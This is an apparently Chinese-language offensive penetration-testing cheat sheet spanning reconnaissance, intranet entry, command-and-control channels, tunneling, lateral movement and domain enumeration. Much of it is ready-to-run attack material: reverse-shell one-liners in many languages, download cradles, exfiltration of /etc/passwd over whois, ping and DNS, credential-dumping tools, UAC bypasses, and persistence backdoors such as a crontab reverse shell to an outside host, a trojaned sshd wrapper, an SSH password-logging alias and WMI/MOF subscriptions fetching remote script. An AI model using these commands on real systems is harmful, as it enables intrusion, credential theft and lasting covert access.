dns.domian.com #指定dns服务器 ls xxx.yyy.cn #列出域信息 GetDomainsBySSL.py :https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&amp;type=note#/ censys.io证书 :https://censys.io/certificates?q=target.com crt.sh证书查询:https://crt.sh/?q=%25.target.com shadon :https://www.shodan.io/ zoomeye :https://www.zoomeye.org/ fofa :https://fofa.so/ censys：https://censys.io/ dnsdb.io :https://dnsdb.io/zh-cn/search?q=target.com api.hackertarget.com :http://api.hackertarget.com/reversedns/?q=target.com community.riskiq.com :https://community.riskiq.com/Search/target.com subdomain3 :https://github.com/yanxiu0614/subdomain3 FuzzDomain :https://github.com/Chora10/FuzzDomain dnsdumpster.com :https://dnsdumpster.com/ phpinfo.me :https://phpinfo.me/domain/ dns开放数据接口 :https://dns.bufferover.run/dns?q=baidu.com 进入内网 基于企业弱账号漏洞 VPN（通过邮箱，密码爆破，社工等途径获取VPN） 企业相关运维系统（zabbix等） 基于系统漏洞进入 Metasploit(漏洞利用框架):https://github.com/rapid7/metasploit-framework 漏洞利用脚本 网站应用程序渗透 SQL注入 跨站脚本（XSS） 跨站请求伪造（CSRF） SSRF（ssrf_proxy） 功能/业务逻辑漏洞 其他漏洞等 CMS-内容管理系统漏洞 企业自建代理 无线Wi-Fi接入 隐匿攻击 Command and Control ICMP :https://pentestlab.blog/2017/07/28/command-and-control-icmp/ DNS :https://pentestlab.blog/2017/09/06/command-and-control-dns/ DropBox :https://pentestlab.blog/2017/08/29/command-and-control-dropbox/ Gmail :https://pentestlab.blog/2017/08/03/command-and-control-gmail/ Telegram :http://drops.xmd5.com/static/drops/tips-16142.html Twitter :https://pentestlab.blog/2017/09/26/command-and-control-twitter/ Website Keyword :https://pentestlab.blog/2017/09/14/command-and-control-website-keyword/ PowerShell :https://pentestlab.blog/2017/08/19/command-and-control-powershell/ Windows COM :https://pentestlab.blog/2017/09/01/command-and-control-windows-com/ WebDAV :https://pentestlab.blog/2017/09/12/command-and-control-webdav/ Office 365 :https://www.anquanke.com/post/id/86974 HTTPS :https://pentestlab.blog/2017/10/04/command-and-control-https/ Kernel :https://pentestlab.blog/2017/10/02/command-and-control-kernel/ Website :https://pentestlab.blog/2017/11/14/command-and-control-website/ WMI :https://pentestlab.blog/2017/11/20/command-and-control-wmi/ WebSocket :https://pentestlab.blog/2017/12/06/command-and-control-websocket/ Images :https://pentestlab.blog/2018/01/02/command-and-control-images/ Web Interface :https://pentestlab.blog/2018/01/03/command-and-control-web-interface/ JavaScript :https://pentestlab.blog/2018/01/08/command-and-control-javascript/ ... Fronting Domain Fronting Tor_Fronting. 代理 VPN shadowsockts :https://github.com/shadowsocks HTTP :http://cn-proxy.com/ Tor 内网跨边界应用 内网跨边界转发 NC端口转发 LCX端口转发 nps -&gt; 个人用觉得比较稳定 ～ frp 代理脚本 Tunna Reduh ... 内网跨边界代理穿透 EW 正向 SOCKS v5 服务器: ./ew -s ssocksd -l 1080 反弹 SOCKS v5 服务器: a) 先在一台具有公网 ip 的主机A上运行以下命令： $ ./ew -s rcsocks -l 1080 -e 8888 b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口 $ ./ew -s rssocks -d 1.1.1.1 -e 8888 多级级联 $ ./ew -s lcx_listen -l 1080 -e 8888 $ ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999 $ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999 lcx_tran 的用法 $ ./ew -s ssocksd -l 9999 $ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999 lcx_listen、lcx_slave 的用法 $ ./ew -s lcx_listen -l 1080 -e 8888 $ ./ew -s ssocksd -l 9999 $ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999 “三级级联”的本地SOCKS测试用例以供参考 $ ./ew -s rcsocks -l 1080 -e 8888 $ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999 $ ./ew -s lcx_listen -l 9999 -e 7777 $ ./ew -s rssocks -d 127.0.0.1 -e 7777 Termite 使用说明:https://rootkiter.com/Termite/README.txt 代理脚本 reGeorg :https://github.com/sensepost/reGeorg shell反弹 bash bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 perl perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};' python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' php php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);' ruby ruby -rsocket -e'f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)' java r = Runtime.getRuntime() p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) p.waitFor() nc #使用-e nc -e /bin/sh 223.8.200.234 1234 #不使用-e mknod /tmp/backpipe p /bin/sh 0/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe lua lua -e &quot;require('socket');require('os');t=socket.tcp();t:connect('202.103.243.122','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');&quot; 内网文件的传输和下载 wput wput dir_name ftp://linuxpig:123456@host.com/ wget wget http://site.com/1.rar -O 1.rar ariac2（需安装） aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2 powershell $p = New-Object System.Net.WebClient $p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;) vbs脚本 Set args = Wscript.Arguments Url = &quot;http://domain/file&quot; dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;) dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;) xHttp.Open &quot;GET&quot;, Url, False xHttp.Send with bStrm .type = 1 ' .open .write xHttp.responseBody .savetofile &quot; C:\\%homepath%\\file&quot;, 2 ' end with 执行 ：cscript test.vbs Perl #!/usr/bin/perl use LWP::Simple; getstore(&quot;http://domain/file&quot;, &quot;file&quot;); 执行：perl test.pl Python #!/usr/bin/python import urllib2 u = urllib2.urlopen('http://domain/file') localFile = open('local_file', 'w') localFile.write(u.read()) localFile.close() 执行：python test.py Ruby #!/usr/bin/ruby require 'net/http' Net::HTTP.start(&quot;www.domain.com&quot;) { |http| r = http.get(&quot;/file&quot;) open(&quot;save_location&quot;, &quot;wb&quot;) { |file| file.write(r.body) } } 执行：ruby test.rb PHP &lt;?php $url = 'http://www.example.com/file'; $path = '/path/to/file'; $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $data = curl_exec($ch); curl_close($ch); file_put_contents($path, $data); ?&gt; 执行：php test.php NC attacker cat file | nc -l 1234 target nc host_ip 1234 &gt; file FTP ftp 127.0.0.1 username password get file exit TFTP tftp -i host GET C:%homepath%file location_of_file_on_tftp_server Bitsadmin bitsadmin /transfer n http://domain/file c:%homepath%file Window 文件共享 net use x: \\127.0.0.1\\share /user:example.comuserID myPassword SCP 本地到远程 scp file user@host.com:/tmp 远程到本地 scp user@host.com:/tmp file rsync 远程rsync服务器中拷贝文件到本地机 rsync -av root@192.168.78.192::www /databack 本地机器拷贝文件到远程rsync服务器 rsync -av /databack root@192.168.78.192::www certutil.exe certutil.exe -urlcache -split -f http://site.com/file copy copy \\\\IP\\ShareName\\file.exe file.exe WHOIS 接收端 Host B： nc -vlnp 1337 | sed &quot;s/ //g&quot; | base64 -d 发送端 Host A： whois -h host_ip -p 1337 `cat /etc/passwd | base64` WHOIS + TAR First: ncat -k -l -p 4444 | tee files.b64 #tee to a file so you can make sure you have it Next tar czf - /tmp/* | base64 | xargs -I bits timeout 0.03 whois -h host_ip -p 4444 bits Finally cat files.b64 | tr -d '\\r\\n' | base64 -d | tar zxv #to get the files out PING 发送端: xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done 接收端ping_receiver.py: import sys try: from scapy.all import * except: print(&quot;Scapy not found, please install scapy: pip install scapy&quot;) sys.exit(0) def process_packet(pkt): if pkt.haslayer(ICMP): if pkt[ICMP].type == 8: data = pkt[ICMP].load[-4:] print(f'{data.decode(&quot;utf-8&quot;)}', flush=True, end=&quot;&quot;, sep=&quot;&quot;) sniff(iface=&quot;eth0&quot;, prn=process_packet) python3 ping_receiver.py DIG 发送端: xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1 +time=1 $line.gooogle.com; done 接收端dns_reciver.py: try: from scapy.all import * except: print(&quot;Scapy not found, please install scapy: pip install scapy&quot;) def process_packet(pkt): if pkt.haslayer(DNS): domain = pkt[DNS][DNSQR].qname.decode('utf-8') root_domain = domain.split('.')[1] if root_domain.startswith('gooogle'): print(f'{bytearray.fromhex(domain[:-13]).decode(&quot;utf-8&quot;)}', flush=True, end='') sniff(iface=&quot;eth0&quot;, prn=process_packet) python3 dns_reciver.py ... 搭建 HTTP server python2 python -m SimpleHTTPServer 1337 python3 python -m http.server 1337 PHP 5.4+ php -S 0.0.0.0:1337 ruby ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port =&gt; 1337, :DocumentRoot =&gt; Dir.pwd).start' ruby -run -e httpd . -p 1337 Perl perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick-&gt;new(port=&gt;1337); $s-&gt;mount(&quot;/&quot;=&gt;{path=&gt;&quot;.&quot;}); $s-&gt;start' perl -MIO::All -e 'io(&quot;:8080&quot;)-&gt;fork-&gt;accept-&gt;(sub { $_[0] &lt; io(-x $1 +? &quot;./$1 |&quot; : $1) if /^GET \\/(.*) / })' busybox httpd busybox httpd -f -p 8000 内网信息搜集 本机信息搜集 1、用户列表 windows用户列表 分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户 2、进程列表 析杀毒软件/安全监控工具等 邮件客户端 VPN ftp等 3、服务列表 与安全防范工具有关服务[判断是否可以手动开关等] 存在问题的服务[权限/漏洞] 4、端口列表 开放端口对应的常见服务/应用程序[匿名/权限/漏洞等] 利用端口进行信息收集 5、补丁列表 分析 Windows 补丁 第三方软件[Java/Oracle/Flash 等]漏洞 6、本机共享 本机共享列表/访问权限 本机访问的域共享/访问权限 7、本用户习惯分析 历史记录 收藏夹 文档等 8、获取当前用户密码工具 Windows mimikatz wce Invoke-WCMDump mimiDbg LaZagne nirsoft_package QuarksPwDump fgdump 星号查看器等 Linux LaZagne mimipenguin 扩散信息收集 端口扫描 常用端口扫描工具 nmap masscan zmap s扫描器 自写脚本等 NC ... 内网拓扑架构分析 DMZ 管理网 生产网 测试网 常见信息收集命令 ipconfig: ipconfig /all ------&gt; 查询本机 IP 段，所在域等 net: net user ------&gt; 本机用户列表 net localgroup administrators ------&gt; 本机管理员[通常含有域用户] net user /domain ------&gt; 查询域用户 net group /domain ------&gt; 查询域里面的工作组 net group &quot;domain admins&quot; /domain ------&gt; 查询域管理员用户组 net localgroup administrators /domain ------&gt; 登录本机的域管理员 net localgroup administrators workgroup\\user001 /add -----&gt;域用户添加到本机 net group &quot;Domain controllers&quot; -------&gt; 查看域控制器(如果有多台) net view ------&gt; 查询同一域内机器列表 net view /domain ------&gt; 查询域列表 net view /domain:domainname dsquery dsquery computer domainroot -limit 65535 &amp;&amp; net group &quot;domain computers&quot; /domain ------&gt; 列出该域内所有机器名 dsquery user domainroot -limit 65535 &amp;&amp; net user /domain------&gt;列出该域内所有用户名 dsquery subnet ------&gt;列出该域内网段划分 dsquery group &amp;&amp; net group /domain ------&gt;列出该域内分组 dsquery ou ------&gt;列出该域内组织单位 dsquery server &amp;&amp; net time /domain------&gt;列出该域内域控制器 第三方信息收集 NETBIOS 信息收集 SMB 信息收集 空会话信息收集 漏洞信息收集等 权限提升 Windows BypassUAC 常用方法 使用IFileOperation COM接口 使用Wusa.exe的extract选项 远程注入SHELLCODE 到傀儡进程 DLL劫持，劫持系统的DLL文件 eventvwr.exe and registry hijacking sdclt.exe SilentCleanup wscript.exe cmstp.exe 修改环境变量，劫持高权限.Net程序 修改注册表HKCU\\Software\\Classes\\CLSID，劫持高权限程序 直接提权过UAC 常用工具 UACME Bypass-UAC Yamabiko ... 提权 windows内核漏洞提权 检测类:Windows-Exploit-Suggester,WinSystemHelper,wesng 利用类:windows-kernel-exploits，BeRoot 服务提权 数据库服务，ftp服务等 WINDOWS错误系统配置 系统服务的错误权限配置漏洞 不安全的注册表权限配置 不安全的文件/文件夹权限配置 计划任务 任意用户以NT AUTHORITY\\SYSTEM权限安装msi 提权脚本 PowerUP,ElevateKit Linux 内核溢出提权 linux-kernel-exploits 计划任务 crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root SUID find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 系统服务的错误权限配置漏洞 cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg 不安全的文件/文件夹权限配置 cat ~/.bash_history cat ~/.nano_history cat ~/.atftp_history cat ~/.mysql_history cat ~/.php_history 找存储的明文用户名，密码 grep -i user [filename] grep -i pass [filename] grep -C 5 &quot;password&quot; [filename] find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla 权限维持 系统后门 Windows 1、密码记录工具 WinlogonHack WinlogonHack 是一款用来劫取远程3389登录密码的工具，在 WinlogonHack 之前有 一个 Gina 木马主要用来截取 Windows 2000下的密码，WinlogonHack 主要用于截 取 Windows XP 以及 Windows 2003 Server。 键盘记录器 安装键盘记录的目地不光是记录本机密码，是记录管理员一切的密码，比如说信箱，WEB 网页密码等等，这样也可以得到管理员的很多信息。 NTPass 获取管理员口令,一般用 gina 方式来,但有些机器上安装了 pcanywhere 等软件，会导致远程登录的时候出现故障，本软件可实现无障碍截取口令。 Linux 下 openssh 后门 重新编译运行的sshd服务，用于记录用户的登陆密码。 2、常用的存储Payload位置 WMI : 存储： $StaticClass = New-Object Management.ManagementClass('root\\cimv2', $null,$null) $StaticClass.Name = 'Win32_Command' $StaticClass.Put() $StaticClass.Properties.Add('Command' , $Payload) $StaticClass.Put() 读取: $Payload=([WmiClass] 'Win32_Command').Properties['Command'].Value 包含数字签名的PE文件 利用文件hash的算法缺陷，向PE文件中隐藏Payload，同时不影响该PE文件的数字签名 特殊ADS … type putty.exe &gt; ...:putty.exe wmic process call create c:\\test\\ads\\...:putty.exe 特殊COM文件 type putty.exe &gt; \\\\.\\C:\\test\\ads\\COM1:putty.exe wmic process call create \\\\.\\C:\\test\\ads\\COM1:putty.exe 磁盘根目录 type putty.exe &gt;C:\\:putty.exe wmic process call create C:\\:putty.exe 3、Run/RunOnce Keys 用户级 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce 管理员 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run 4、BootExecute Key 由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为： HKLM\\SYSTEM\\CurrentControlSet\\Control\\hivelist HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet002\\Control\\Session Manager 5、Userinit Key WinLogon进程加载的login scripts,具体键值： HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon 6、Startup Keys HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders 7、Services 创建服务 sc create [ServerName] binPath= BinaryPathName 8、Browser Helper Objects 本质上是Internet Explorer启动时加载的DLL模块 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects 9、AppInit_DLLs 加载User32.dll会加载的DLL HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs 10、文件关联 HKEY_LOCAL_MACHINE\\Software\\Classes HKEY_CLASSES_ROOT 11、bitsadmin bitsadmin /create backdoor bitsadmin /addfile backdoor %comspec% %temp%\\cmd.exe bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe &quot;/u /s /i:https://host.com/calc.sct scrobj.dll&quot; bitsadmin /Resume backdoor 12、mof pragma namespace(&quot;\\\\\\\\.\\\\root\\\\subscription&quot;) instance of __EventFilter as $EventFilter { EventNamespace = &quot;Root\\\\Cimv2&quot;; Name = &quot;filtP1&quot;; Query = &quot;Select * From __InstanceModificationEvent &quot; &quot;Where TargetInstance Isa \\&quot;Win32_LocalTime\\&quot; &quot; &quot;And TargetInstance.Second = 1&quot;; QueryLanguage = &quot;WQL&quot;; }; instance of ActiveScriptEventConsumer as $Consumer { Name = &quot;consP1&quot;; ScriptingEngine = &quot;JScript&quot;; ScriptText = &quot;GetObject(\\&quot;script:https://host.com/test\\&quot;)&quot;; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; }; 管理员执行： mofcomp test.mof 13、wmi 每隔60秒执行一次notepad.exe wmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH __EventFilter CREATE Name=&quot;BotFilter82&quot;, EventNameSpace=&quot;root\\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'&quot; wmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;BotConsumer23&quot;, ExecutablePath=&quot;C:\\Windows\\System32\\notepad.exe&quot;,CommandLineTemplate=&quot;C:\\Windows\\System32\\notepad.exe&quot; wmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\\&quot;BotFilter82\\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\\&quot;BotConsumer23\\&quot;&quot; 14、Userland Persistence With Scheduled Tasks 劫持计划任务UserTask，在系统启动时加载dll function Invoke-ScheduledTaskComHandlerUserTask { [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')] Param ( [Parameter(Mandatory = $True)] [ValidateNotNullOrEmpty()] [String] $Command, [Switch] $Force ) $ScheduledTaskCommandPath = &quot;HKCU:\\Software\\Classes\\CLSID\\{58fb76b9-ac85-4e55-ac04-427593b1d060}\\InprocServer32&quot; if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){ New-Item $ScheduledTaskCommandPath -Force | New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null }else{ Write-Verbose &quot;Key already exists, consider using -Force&quot; exit } if (Test-Path $ScheduledTaskCommandPath) { Write-Verbose &quot;Created registry entries to hijack the UserTask&quot; }else{ Write-Warning &quot;Failed to create registry key, exiting&quot; exit } } Invoke-ScheduledTaskComHandlerUserTask -Command &quot;C:\\test\\testmsg.dll&quot; -Verbose 15、Netsh netsh add helper c:\\test\\netshtest.dll 后门触发：每次调用netsh dll编写:https://github.com/outflanknl/NetshHelperBeacon 16、Shim 常用方式： InjectDll RedirectShortcut RedirectEXE 17、DLL劫持 通过Rattler自动枚举进程，检测是否存在可用dll劫持利用的进程 使用：Procmon半自动测试更精准，常规生成的dll会导致程序执行报错或中断，使用AheadLib配合生成dll劫持利用源码不会影响程序执行 工具：https://github.com/sensepost/rattler 工具：https://github.com/Yonsm/AheadLib 18、DoubleAgent 编写自定义Verifier provider DLL 通过Application Verifier进行安装 注入到目标进程执行payload 每当目标进程启动，均会执行payload，相当于一个自启动的方式 POC : https://github.com/Cybellum/DoubleAgent 19、waitfor.exe 不支持自启动，但可远程主动激活，后台进程显示为waitfor.exe POC : https://github.com/3gstudent/Waitfor-Persistence 20、AppDomainManager 针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制 21、Office 劫持Office软件的特定功能:通过dll劫持,在Office软件执行特定功能时触发后门 利用VSTO实现的office后门 Office加载项 Word WLL Excel XLL Excel VBA add-ins PowerPoint VBA add-ins 参考1 ：https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/ 参考2 ：https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/ 22、CLR 无需管理员权限的后门，并能够劫持所有.Net程序 POC:https://github.com/3gstudent/CLR-Injection 23、msdtc 利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测 利用：向 %windir%\\system32\\目录添加dll并重命名为oci.dll 24、Hijack CAccPropServicesClass and MMDeviceEnumerato 利用COM组件，不需要重启系统，不需要管理员权限 通过修改注册表实现 POC：https://github.com/3gstudent/COM-Object-hijacking 25、Hijack explorer.exe COM组件劫持，不需要重启系统，不需要管理员权限 通过修改注册表实现 HKCU\\Software\\Classes\\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1} HKCU\\Software\\Classes\\CLSID{fbeb8a05-beee-4442-804e-409d6c4515e9} HKCU\\Software\\Classes\\CLSID{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7} HKCU\\Software\\Classes\\Wow6432Node\\CLSID{BCDE0395-E52F-467C-8E3D-C4579291692E} 26、Windows FAX DLL Injection 通过DLL劫持，劫持Explorer.exe对fxsst.dll的加载 Explorer.exe在启动时会加载c:\\Windows\\System32\\fxsst.dll(服务默认开启，用于传真服务)将payload.dll保存在c:\\Windows\\fxsst.dll，能够实现dll劫持，劫持Explorer.exe对fxsst.dll的加载 27、特殊注册表键值 在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取(使用Win32 API)，但系统能够执行(使用Native API)。 《渗透技巧——&quot;隐藏&quot;注册表的创建》 《渗透技巧——&quot;隐藏&quot;注册表的更多测试》 28、快捷方式后门 替换我的电脑快捷方式启动参数 POC : https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1 29、Logon Scripts New-ItemProperty &quot;HKCU:\\Environment\\&quot; UserInitMprLogonScript -value &quot;c:\\test\\11.bat&quot; -propertyType string | Out-Null 30、Password Filter DLL 31、利用BHO实现IE浏览器劫持 Linux crontab 每60分钟反弹一次shell给dns.wuyun.org的53端口 #!bash (crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/dns.wuyun.org/53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\\rno crontab for `whoami`%100c\\n&quot;)|crontab - 硬链接sshd #!bash ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333; 链接：ssh root@192.168.206.142 -p 2333 SSH Server wrapper #!bash cd /usr/sbin mv sshd ../bin echo '#!/usr/bin/perl' &gt;sshd echo 'exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);' &gt;&gt;sshd echo 'exec {&quot;/usr/bin/sshd&quot;} &quot;/usr/sbin/sshd&quot;,@ARGV,' &gt;&gt;sshd chmod u+x sshd //不用重启也行 /etc/init.d/sshd restart socat STDIO TCP4:192.168.206.142:22,sourceport=13377 SSH keylogger vim当前用户下的.bashrc文件,末尾添加 #!bash alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh' source .bashrc Cymothoa_进程注入backdoor ./cymothoa -p 2270 -s 1 -y 7777 nc -vv ip 7777 rootkit openssh_rootkit Kbeast_rootkit Mafix + Suterusu rootkit Tools Vegile backdoor WEB后门 PHP Meterpreter后门 Aspx Meterpreter后门 weevely webacoo .... 横向渗透 端口渗透 端口扫描 1.端口的指纹信息（版本信息） 2.端口所对应运行的服务 3.常见的默认端口号 4.尝试弱口令 端口爆破 hydra 端口弱口令 NTScan Hscan 自写脚本 端口溢出 smb ms08067 ms17010 ms11058 ... apache ftp ... 常见的默认端口 1、web类(web漏洞/敏感目录) 第三方通用组件漏洞: struts thinkphp jboss ganglia zabbix ... 80 web 80-89 web 8000-9090 web 2、数据库类(扫描弱口令) 1433 MSSQL 1521 Oracle 3306 MySQL 5432 PostgreSQL 50000 DB2 3、特殊服务类(未授权/命令执行类/漏洞) 443 SSL心脏滴血 445 ms08067/ms11058/ms17010等 873 Rsync未授权 5984 CouchDB http://xxx:5984/_utils/ 6379 redis未授权 7001,7002 WebLogic默认弱口令，反序列 9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 11211 memcache未授权访问 27017,27018 Mongodb未授权访问 50000 SAP命令执行 50070,50030 hadoop默认端口未授权访问 4、常用端口类(扫描弱口令/端口爆破) 21 ftp 22 SSH 23 Telnet 445 SMB弱口令扫描 2601,2604 zebra路由，默认密码zebra 3389 远程桌面 5、端口合计所对应的服务 21 ftp 22 SSH 23 Telnet 25 SMTP 53 DNS 69 TFTP 80 web 80-89 web 110 POP3 135 RPC 139 NETBIOS 143 IMAP 161 SNMP 389 LDAP 443 SSL心脏滴血以及一些web漏洞测试 445 SMB 512,513,514 Rexec 873 Rsync未授权 1025,111 NFS 1080 socks 1158 ORACLE EMCTL2601,2604 zebra路由，默认密码zebra案 1433 MSSQL (暴力破解) 1521 Oracle:(iSqlPlus Port:5560,7778) 2082/2083 cpanel主机管理系统登陆 （国外用较多） 2222 DA虚拟主机管理系统登陆 （国外用较多） 2601,2604 zebra路由，默认密码zebra 3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 3306 MySQL （暴力破解） 3312/3311 kangle主机管理系统登陆 3389 远程桌面 3690 svn 4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 4848 GlassFish web中间件 弱口令:admin/adminadmin 5432 PostgreSQL 5900 vnc 5984 CouchDB http://xxx:5984/_utils/ 6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 6379 redis未授权 7001,7002 WebLogic默认弱口令，反序列 7778 Kloxo主机控制面板登录 8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 8080 tomcat/WDCd/ 主机管理系统，默认弱口令 8080,8089,9090 JBOSS 8081 Symantec AV/Filter for MSE 8083 Vestacp主机管理系统 （国外用较多） 8649 ganglia 8888 amh/LuManager 主机管理系统默认端口 9000 fcgi fcig php执行 9043 websphere[web中间件] 弱口令: admin/admin websphere/ websphere ststem/manager 9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 10000 Virtualmin/Webmin 服务器虚拟主机管理系统 11211 memcache未授权访问 27017,27018 Mongodb未授权访问 28017 mongodb统计页面 50000 SAP命令执行 50060 hadoop 50070,50030 hadoop默认端口未授权访问 域渗透 信息搜集 powerview.ps1 Get-NetDomain - gets the name of the current user's domain Get-NetForest - gets the forest associated with the current user's domain Get-NetForestDomains - gets all domains for the current forest Get-NetDomainControllers - gets the domain controllers for the current computer's domain Get-NetCurrentUser - gets the current [domain\\]username Get-NetUser - returns all user objects, or the user specified (wildcard specifiable) Get-NetUserSPNs - gets all user ServicePrincipalNames Get-NetOUs - gets data for domain organization units Get-NetGUIDOUs - finds domain OUs linked to a specific GUID Invoke-NetUserAdd - adds a local or domain user Get-NetGroups - gets a list of all current groups in the domain Get-NetGroup - gets data for each user in a specified domain group Get-NetLocalGroups - gets a list of localgroups on a remote host or hosts Get-NetLocalGroup - gets the members of a localgroup on a remote host or hosts Get-NetLocalServices - gets a list of running services/paths on a remote host or hosts Invoke-NetGroupUserAdd - adds a user to a specified local or domain group Get-NetComputers - gets a list of all current servers in the domain Get-NetFileServers - get a list of file servers used by current domain users Get-NetShare - gets share information for a specified server Get-NetLoggedon - gets users actively logged onto a specified server Get-NetSessions - gets active sessions on a specified server Get-NetFileSessions - returned combined Get-NetSessions and Get-NetFiles Get-NetConnections - gets active connections to a specific server resource (share) Get-NetFiles - gets open files on a server Get-NetProcesses - gets the remote processes and owners on a remote server BloodHound 获取域内DNS信息 adidnsdump 